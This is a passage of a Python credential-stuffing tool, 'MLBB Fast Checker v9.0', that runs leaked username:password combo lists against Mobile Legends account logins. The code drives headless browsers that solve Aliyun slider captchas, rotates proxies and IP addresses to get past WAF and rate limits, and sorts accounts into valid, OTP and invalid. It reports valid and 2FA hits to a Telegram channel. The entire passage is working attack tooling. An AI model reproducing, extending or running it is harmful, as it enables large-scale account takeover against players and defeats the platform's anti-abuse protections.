            await send_tg(f"🔑 <b>2FA / OTP</b>\n<code>{esc_html(user)}:{esc_html(passw)}</code>\nEmail: {esc_html(masked_email)}")
        elif kind == 'INVALID':
            append_line(FILES['INVALID'], f"{user}:{passw}|{iso_time}")
            stats['invalid'] += 1
            print_result('INVALID', user, passw, res_data.get('message', 'Wrong pass'))
        else:
            why = res_data.get('message', kind)
            append_line(FILES['ERR'], f"{user}:{passw}|{why}|{iso_time}")
            stats['error'] += 1
            print_result('ERR', user, passw, why)

    async def _clear_otp_form(p):
        try:
            await p.evaluate("""() => {
                let el = document.querySelector('.content-but');
                while (el) {
                    if (el.__vue__ && el.__vue__.setemailvalue) {
                        el.__vue__.setemailvalue(''); el.__vue__.setpasswordvalue(''); break;
                    }
                    el = el.parentElement;
                }
            }""")
        except Exception:
            pass

    async def _open_ready_ctx(max_tries: int = 3, rotate_ip: bool = False) -> bool:
        for t in range(max_tries):
            if await open_context_and_page(rotate_ip=(rotate_ip or t > 0)) and await ensure_slider_cleared():
                return True
            await _close_ctx()
            await asyncio.sleep(0.5 * (t + 1))
        return False

    if not await _open_ready_ctx(max_tries=3):
        if not _TUI_ACTIVE: p_out(f"{c(RED)}[!] Worker {wid} gagal startup, mencoba restart...{W}")
        await _close_ctx()
        if not combo_q.empty():
            raise RuntimeError(f"w{wid}_startup_failed")
        return

    ctx_cond = asyncio.Condition()
    ctx_gen = 0
    ctx_accts = 0
    inflight_tabs = 0
    recovering = False
    ACCOUNTS_PER_CTX = 30  # ponytail: proactive IP rotation before Aliyun ~25-35 acct throttle wall

    async def _recover_ctx(local_gen: int, reason: str):
        nonlocal ctx_gen, ctx_accts, slider_cleared, recovering
        async with ctx_cond:
            while recovering:
                await ctx_cond.wait()
            # Another tab already rotated/refreshed this context; skip duplicate work
            if local_gen != ctx_gen:
                return page is not None
            ctx_gen += 1
            recovering = True
            if reason == 'periodic_rotate' and inflight_tabs > 0:
                try:
                    await asyncio.wait_for(ctx_cond.wait_for(lambda: inflight_tabs == 0), timeout=6.0)
                except Exception:
                    pass
        try:
            if reason != 'waf_refresh':
                ctx_accts = 0
            if reason == 'waf_refresh' and page is not None:
                try:
                    await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                    if page2 is not None:
                        await page2.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                    slider_cleared = False
                    if await ensure_slider_cleared():
                        return True
                except Exception:
                    pass
            return await _open_ready_ctx(max_tries=3, rotate_ip=True)
        finally:
            async with ctx_cond:
                recovering = False
                ctx_cond.notify_all()

    async def _tab_loop(tab_idx: int):
        nonlocal page2, ctx_accts, inflight_tabs
        p2_miss = 0
        while True:
            try:
                u, pw = combo_q.get_nowait()
            except asyncio.QueueEmpty:
                break

            done_item = False
            try:
                while True:
                    need_recover_gen = None
                    p_tab = None
                    async with ctx_cond:
                        while recovering:
                            await ctx_cond.wait()
                        if page is None or ctx is None:
                            need_recover_gen = ctx_gen
                        else:
                            p_tab = page if tab_idx == 0 else page2
                            if p_tab is not None:
                                my_gen = ctx_gen
                                inflight_tabs += 1

                    if need_recover_gen is not None:
                        ok_ctx = await _recover_ctx(need_recover_gen, 'rotate')
                        if not ok_ctx:
                            raise RuntimeError(f"w{wid}_ctx_recovery_failed")
                        continue

                    if p_tab is None:
                        # Tab 1: never collide on Tab 0's `page`; recreate `page2` once ready or back off cleanly
                        if tab_idx == 1 and ctx is not None and slider_cleared:
                            try:
                                new_p2 = await ctx.new_page()
                                await _attach_page(new_p2)
                                page2 = new_p2
                                p2_miss = 0
                                continue
                            except Exception:
                                page2 = None
                        p2_miss += 1
                        if p2_miss > 10:
                            # Tab 1 persistently unavailable on this context; return item & exit Tab 1 while Tab 0 continues
                            combo_q.put_nowait((u, pw))
                            combo_q.task_done()
                            done_item = True
                            return
                        await asyncio.sleep(0.5)
                        continue

                    p2_miss = 0
                    try:
                        kind, res_data = await do_login_via_browser(p_tab, ctx, u, pw, wid)
                    except Exception as ex:
                        kind, res_data = 'ERR', {'message': str(ex)[:60]}
                    finally:
                        async with ctx_cond:
                            inflight_tabs = max(0, inflight_tabs - 1)
                            ctx_cond.notify_all()

                    err_msg = str(res_data.get('message', ''))

                    if kind in ('VALID', 'INVALID', 'OTP', 'UNKNOWN'):
                        if kind in ('VALID', 'OTP'):
                            await _clear_otp_form(p_tab)
                        _acct_retries.pop(f"{u}:{pw}", None)
                        ctx_accts += 1
                        stats['checked'] += 1
                        await handle_result(kind, res_data, u, pw, res_data.get('decrypted_data', {}))
                        combo_q.task_done()
                        done_item = True
                        print_progress()
                        if ctx_accts >= ACCOUNTS_PER_CTX:
                            await _recover_ctx(my_gen, 'periodic_rotate')
                        break

                    # Do NOT burn account retries if another tab rotated/refreshed context mid-flight
                    if my_gen != ctx_gen:
                        await asyncio.sleep(0.1)
                        continue

                    k_id = f"{u}:{pw}"
                    _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
                    if _acct_retries[k_id] > 3:
                        _acct_retries.pop(k_id, None)
                        stats['checked'] += 1
                        await handle_result('ERR', {'message': err_msg or f'{kind}_exhausted'}, u, pw, {})
                        combo_q.task_done()
                        done_item = True
                        print_progress()
                        break

                    if kind == 'WAF':
                        stats['waf'] += 1
                        waf_mode = 'rotate' if (ctx_accts > 0 or _acct_retries[k_id] >= 2) else 'waf_refresh'
                        if not await _recover_ctx(my_gen, waf_mode):
                            raise RuntimeError(f"w{wid}_waf_recovery_failed")
                    elif kind == 'RATE' or any(k in err_msg for k in ('TUNNEL', 'PROXY', 'CONNECTION_FAILED', 'Connection closed', 'Target closed')) or err_msg == 'timeout_waiting_response':
                        if not await _recover_ctx(my_gen, 'rotate'):
                            raise RuntimeError(f"w{wid}_rate_recovery_failed")
                    else:
                        await asyncio.sleep(0.3)
            except BaseException:
                if not done_item:
                    try:
                        combo_q.put_nowait((u, pw))
                    except Exception:
                        pass
                    combo_q.task_done()
                raise

    tab_tasks = [asyncio.create_task(_tab_loop(0)), asyncio.create_task(_tab_loop(1))]
    try:
        # Run Tab 0 and Tab 1 independently without waiting for the slower tab in each pair
        await asyncio.gather(*tab_tasks)
    except asyncio.CancelledError:
        for t in tab_tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tab_tasks, return_exceptions=True)
        raise
    except Exception as e:
        dbg(f"w{wid} worker crash: {e}")
        for t in tab_tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tab_tasks, return_exceptions=True)
        if not combo_q.empty():
            raise
    finally:
        await _close_ctx()

# ── Interactive CLI Menu (checker.js style) ──────────────────────────────────
def ask(label: str, default: str = '') -> str:
    d = f" \033[90m[{default}]\033[0m" if default else ''
    try:
        v = input(f"  \033[36m◈\033[0m {label}{d} \033[90m›\033[0m ").strip().strip('"').strip("'")
    except EOFError:
        v = ''
    return v or default

def ask_yn(label: str, default: str = 'y') -> bool:
    while True:
        try:
            r = input(f"  \033[96m❯\033[0m {label} \033[90m(y/n)\033[0m  \033[95m❯\033[0m ").strip().lower()
        except EOFError:
            r = ''
        if not r:
            return default in ('y', 'yes')
        if r in ('y', 'yes'):
            return True
        if r in ('n', 'no'):
            return False

# ── Main Entrypoint ──────────────────────────────────────────────────────────
async def async_main():
    pa = argparse.ArgumentParser(description='MLBB Fast Checker v9.0 — Python Native Browser')
    pa.add_argument('combo', nargs='?', default='')
    pa.add_argument('--workers', type=int, default=0)
    pa.add_argument('--headless', dest='headless', action='store_true', default=None)
    pa.add_argument('--no-headless', dest='headless', action='store_false', default=None)
    pa.add_argument('--debug', action='store_true')
    pa.add_argument('--out', type=str, default='')
    pa.add_argument('--no-prompt', action='store_true')
    pa.add_argument('--proxy-file', type=str, default='')
    pa.add_argument('--no-proxy', action='store_true', default=False)
    pa.add_argument('--license-key', type=str, default='')
    pa.add_argument('--selftest', action='store_true')
    args = pa.parse_args()

    # Selftest block
    if args.selftest:
        print("[*] Running built-in self-tests...")
        # 1. Crypto test
        assert decrypt_payload('52tIWV2NVCdzwLNUYKIrSbpalhAnYRFm8UIZ5iEyGXIL') != ''
        # 2. Classify test
        assert classify({'code': 0}) == 'VALID'
        assert classify({'code': 1002, 'message': 'PasswdError'}) == 'INVALID'
        assert classify({'code': 1086}) == 'OTP'
        assert classify({'code': 1036}) == 'RATE'
        assert classify(None) == 'WAF'
        assert classify({'__waf': True}) == 'WAF'
        # 3. Combo gen test
        names = load_names()
        assert len(names) >= 60
        u, _ = random_username(names)
        assert len(u) >= 2
        # 4. Rotated user test
        ru = rotated_user('00e91bee206c1bd4086e__cr.sg')
        assert ru['region'] != ''
        assert ru['session'] != ''
        assert '__s_' in ru['user']
        # 4. Proxy parse
        p = parse_proxy('user:pass@1.2.3.4:8080')
        assert p and p['username'] == 'user'
        p2 = parse_proxy('1.2.3.4:8080:u2:p2')
        assert p2 and p2['username'] == 'u2'
        print("[✓] All self-tests passed successfully!")
        return

    global DEBUG, HEADLESS, NUM_CONTEXTS, PROXY_ENABLED, PROXY_FILE, OUTPUT_DIR, _TUI_ACTIVE, _pw_instance, _driver_pid

    combo_path = ''
    workers = 3

    if args.out:
        OUTPUT_DIR = os.path.join(BASE, args.out.replace(' ', '_'))

    if args.no_prompt or (args.combo and args.workers > 0):
        combo_path = args.combo or os.path.join(BASE, 'combo.txt')
        workers = max(1, min(30, args.workers or 5))
        HEADLESS = args.headless if args.headless is not None else True
        DEBUG = args.debug
        if args.proxy_file:
            PROXY_ENABLED = True
            if os.path.exists(args.proxy_file):
                PROXY_FILE = os.path.abspath(args.proxy_file)
            elif os.path.exists(os.path.join(BASE, args.proxy_file)):
                PROXY_FILE = os.path.join(BASE, args.proxy_file)
            elif os.path.exists(os.path.join(PROJECT_ROOT, args.proxy_file)):
                PROXY_FILE = os.path.join(PROJECT_ROOT, args.proxy_file)
            else:
                PROXY_FILE = os.path.abspath(args.proxy_file)
        elif args.no_proxy:
            PROXY_ENABLED = False
    else:
        os.system("cls" if os.name == "nt" else "clear")
        p_out(f"""
  {c(CYAN)}╭──────────────────────────────────────────────────────────────╮{W}
  {c(CYAN)}│{W}                 {c(WHITE)}{BD}⚡ MLBB FAST CHECKER v9.0 ⚡{W}                 {c(CYAN)}│{W}
  {c(CYAN)}│{W}        {c(GRAY)}Native Direct-Vue Bridge · Auto Aliyun Slider{W}         {c(CYAN)}│{W}
  {c(CYAN)}╰──────────────────────────────────────────────────────────────╯{W}
""")
        default_combo = os.path.join(PROJECT_ROOT, 'Base', 'combo.txt')
        if not os.path.exists(default_combo):
            default_combo = os.path.join(BASE, 'combo.txt')
        combo_path = ask("Combo file ", default_combo)
        if not os.path.isabs(combo_path):
            t = os.path.join(BASE, combo_path)
            if os.path.exists(t):
                combo_path = t

        workers_str = ask("Worker threads (1-30, rec 4-6)", "4")
        workers = max(1, min(30, int(workers_str) if workers_str.isdigit() else 5))
        HEADLESS = True  # ponytail: always headless
        DEBUG = False
        OUTPUT_DIR = os.path.join(BASE, "output")

        # Proxy prompt: directly ask proxy file (empty = direct), no extra y/n prompts
        default_proxy = os.path.join(PROJECT_ROOT, 'Base', 'Proxy.txt')
        if not os.path.exists(default_proxy):
            default_proxy = os.path.join(BASE, 'proxies.txt')
        has_default_proxy = os.path.exists(default_proxy)
        pf = ask("Proxy file (enter = direct)", default_proxy if has_default_proxy else '')
        if pf:
            PROXY_ENABLED = True
            if os.path.exists(pf):
                PROXY_FILE = os.path.abspath(pf)
            elif os.path.exists(os.path.join(BASE, pf)):
                PROXY_FILE = os.path.join(BASE, pf)
            elif os.path.exists(os.path.join(PROJECT_ROOT, pf)):
                PROXY_FILE = os.path.join(PROJECT_ROOT, pf)
            else:
                PROXY_FILE = os.path.abspath(pf)
        else:
            PROXY_ENABLED = False

    NUM_CONTEXTS = workers
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Load combos & apply resume
    if not os.path.isabs(combo_path):
        if os.path.exists(combo_path):
            combo_path = os.path.abspath(combo_path)
        else:
            combo_path = os.path.join(BASE, combo_path)
    combos = load_combos(combo_path)
    done_accounts = load_done()
    queue = [x for x in combos if x[0].lower() not in done_accounts]

    p_out(f"""
  {c(GRAY)}┌─ CONFIGURATION ──────────────────────────────────────────────┐{W}
  {c(GRAY)}│{W}  {c(WHITE)}Queue   :{W} {c(GREEN)}{len(queue):,} accounts{W} {c(GRAY)}(total: {len(combos):,}, done: {len(done_accounts):,}){W}
  {c(GRAY)}│{W}  {c(WHITE)}Workers :{W} {c(CYAN)}{NUM_CONTEXTS} browser contexts (Headless){W}
  {c(GRAY)}│{W}  {c(WHITE)}Proxy   :{W} {c(GOLD)}{shortpath(PROXY_FILE) if PROXY_ENABLED else 'Direct Mode'}{W}
  {c(GRAY)}│{W}  {c(WHITE)}Output  :{W} {c(GRAY)}{shortpath(OUTPUT_DIR)}/{W}
  {c(GRAY)}└──────────────────────────────────────────────────────────────┘{W}
""")

    if not queue:
        p_out(f"{c(GREEN)}[*] Semua akun pada file combo sudah selesai diperiksa.{W}")
        return

    # Inisialisasi DeviceManager
    dm = None
    if INFO_OK and DeviceManager:
        try:
            dev_file = DEVICES_FILE if os.path.exists(DEVICES_FILE) else os.path.join(PROJECT_ROOT, 'Base', 'devices.txt')
            dm = DeviceManager(dev_file)
            p_out(f"{c(GREEN)}[*] Player Info Lookup : AKTIF ({len(dm.devices)} devices){W}")
        except Exception as e:
            p_out(f"{c(GOLD)}[!] DeviceManager init note: {e}{W}")

    # Launch browser utama (CloakBrowser Pro / Fallback Playwright Chrome)
    activate_cloak_license(args.license_key)
    p_out(f"{c(CYAN)}[*] Menyiapkan engine browser...{W}")
    browser_ref = [None]
    browser_lock = asyncio.Lock()
    tasks = []

    async def ensure_browser(force_relaunch: bool = False):
        global _driver_pid, _pw_instance
        async with browser_lock:
            cur = browser_ref[0]
            need = force_relaunch or (cur is None)
            if not need:
                try:
                    need = not cur.is_connected()
                except Exception:
                    need = True
            if need:
                if cur is not None:
                    try:
                        await cur.close()
                    except Exception:
                        pass
                    browser_ref[0] = None
                    _driver_pid = None
                if _pw_instance is not None:
                    try:
                        await _pw_instance.stop()
                    except Exception:
                        pass
                    _pw_instance = None
                if force_relaunch:
                    await asyncio.sleep(2.0)
                browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=True)
            return browser_ref[0]

    try:
        browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=True)

        # Proxy testing & assignment
        proxy_assignments = [None] * NUM_CONTEXTS
        live_pool = None
        if PROXY_ENABLED:
            raw_p = load_proxies(PROXY_FILE)
            if raw_p:
                p_out(f"{c(CYAN)}[*] Menguji {len(raw_p)} proxy...{W}")
                # FIX: test_proxies tidak lagi butuh browser (raw HTTP test)
                good_proxies = await test_proxies(raw_p, concurrency=10)
                if good_proxies:
                    p_out(f"{c(GREEN)}[*] {len(good_proxies)} proxy berfungsi ✓{W}")
                    live_pool = [p[1] for p in good_proxies]
                    for i in range(NUM_CONTEXTS):
                        proxy_assignments[i] = good_proxies[i % len(good_proxies)][1]
                else:
                    p_out(f"\n  {c(RED)}{BD}[!] Semua proxy gagal diuji.{W}")
                    p_out(f"  {c(GOLD)}Penyebab: Kuota DataImpulse habis (407 TRAFFIC_EXHAUSTED) atau proxy offline.{W}")
                    p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
                    return

        stats['total'] = len(queue)
        stats['start'] = time.time()
        stats['workers'] = min(NUM_CONTEXTS, len(queue))
        stats['proxy_label'] = f"{os.path.basename(PROXY_FILE)} ({len(live_pool or [])} live)" if PROXY_ENABLED else "None (Direct)"
        _TUI_ACTIVE = True
        sys.stdout.write("\033[?1049h\033[?25l\033[2J\033[H")
        sys.stdout.flush()
        render_dashboard(force=True)

        # asyncio.Queue: thread-safe, tidak ada race condition saat banyak worker
        # menarik combo secara bersamaan (tidak seperti shared iterator/next()).
        combo_q: asyncio.Queue = asyncio.Queue()
        for item in queue:
            combo_q.put_nowait(item)


        # Worker wrapper: auto-restart jika worker crash sebelum queue habis.
        # Tanpa ini, satu crash = satu worker mati permanen dan throughput turun.
        async def worker_with_restart(wid: int, p_info):
            MAX_CONSECUTIVE_FAILS = 10
            fail_count = 0
            while not combo_q.empty():
                started_at = time.time()
                try:
                    cur_b = await ensure_browser(force_relaunch=(fail_count >= 2))
                    await run_worker(
                        wid, queue, combo_q, cur_b, dm, p_info, live_pool,
                        ensure_browser=ensure_browser,
                    )
                    if combo_q.empty():
                        break  # selesai normal
                    fail_count += 1
                except asyncio.CancelledError:
                    raise  # propagate Ctrl+C
                except Exception as e:
                    if time.time() - started_at > 60:
                        fail_count = 0  # reset counter after sustained healthy work
                    fail_count += 1
                    if fail_count > MAX_CONSECUTIVE_FAILS:
                        if not _TUI_ACTIVE:
                            p_out(f"{c(RED)}[!] w{wid} crash {MAX_CONSECUTIVE_FAILS}x berturut-turut, dihentikan: {e}{W}")
                        _LIVE_LOGS.append(('ERR', f"worker-{wid}", f"stopped:{str(e)[:22]}"))
                        render_dashboard()
                        break
                    wait = min(2 ** min(fail_count, 4), 16)  # exponential backoff max 16s
                    if not _TUI_ACTIVE:
                        p_out(f"{c(GOLD)}[!] w{wid} crash #{fail_count}, restart dalam {wait}s...{W}")
                    _LIVE_LOGS.append(('ERR', f"worker-{wid}", f"restart #{fail_count}"))
                    render_dashboard()
                    await asyncio.sleep(wait)

        num_workers = min(NUM_CONTEXTS, len(queue))
        for i in range(num_workers):
            p_info = proxy_assignments[i] if PROXY_ENABLED else None
            tasks.append(asyncio.create_task(worker_with_restart(i, p_info)))

        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            p_out(f"\n{Y}[*] Menghentikan worker...{W}")
            for t in tasks:
                t.cancel()
            # Tunggu sebentar agar semua worker bisa cleanup dengan benar
            await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        if _TUI_ACTIVE:
            stats['status'] = 'DONE'
            render_dashboard(force=True)
            _TUI_ACTIVE = False
            sys.stdout.write("\033[?1049l\033[?25h\n")
            sys.stdout.flush()
        if browser_ref[0]:
            try:
                await browser_ref[0].close()
            except Exception:
                pass
            _driver_pid = None
        if _pw_instance:
            try:
                await _pw_instance.stop()
            except Exception:
                pass
            _pw_instance = None
        if _LICENSE_SESSION_ACTIVE:
            withdraw_cloak_license()
            p_out(f"{c(GRAY)}[*] License key CloakBrowser ditarik dari device ✓{W}")

    el = max(time.time() - stats['start'], 1)
    px = stats['proxy_ctx']
    ck = stats['checked']
    p_out(f"""
  {c(GREEN)}╭────────────────────── CHECK COMPLETE ──────────────────────╮{W}
  {c(GREEN)}│{W}  {c(WHITE)}{BD}TOTAL CHECKED{W} : {ck:,} accounts
  {c(GREEN)}│{W}  {c(GREEN)}{BD}✓ VALID HITS {W} : {stats['valid']:,}
  {c(GREEN)}│{W}  {c(GOLD)}{BD}★ 2FA / OTP  {W} : {stats['otp']:,}
  {c(GREEN)}│{W}  {c(RED)}{BD}✗ INVALID    {W} : {stats['invalid']:,}
  {c(GREEN)}│{W}  {c(GRAY)}{BD}! ERRORS     {W} : {stats['error']:,}
  {c(GREEN)}│{W}  {c(CYAN)}SPEED / TIME {W} : {ck/el:.2f} acc/s  ({int(el)}s elapsed)
  {c(GREEN)}│{W}  {c(GOLD)}PROXY QUOTA  {W} : {_fmt_bytes(stats['bytes_used'])}  ({_fmt_bytes(int(stats['bytes_used']/max(ck,1)))}/acc)
  {c(GREEN)}│{W}  {c(GRAY)}OUTPUT DIR   {W} : {shortpath(OUTPUT_DIR)}/
  {c(GREEN)}╰────────────────────────────────────────────────────────────╯{W}
""")

def main():
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        p_out(f"\n{Y}Program dihentikan.{W}")
    finally:
        _emergency_cleanup()

if __name__ == '__main__':
    main()
